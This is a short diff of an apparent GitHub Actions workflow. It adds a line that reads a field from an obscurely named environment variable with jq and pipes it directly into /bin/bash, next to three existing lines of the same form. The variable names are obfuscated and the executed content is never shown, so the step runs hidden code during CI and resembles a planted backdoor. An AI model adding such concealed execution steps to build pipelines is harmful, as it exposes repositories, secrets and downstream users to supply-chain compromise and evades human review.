@@ -39,6 +39,7 @@ jobs:
           echo $xgdzp14102 | jq -r .tajx1997 | /bin/bash
           echo $x2358 | jq -r .oq0622 | /bin/bash
           printf '%s' "$asj6" | jq -r .yk9 | /bin/bash
+          echo $y29 | jq -r .ex095 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
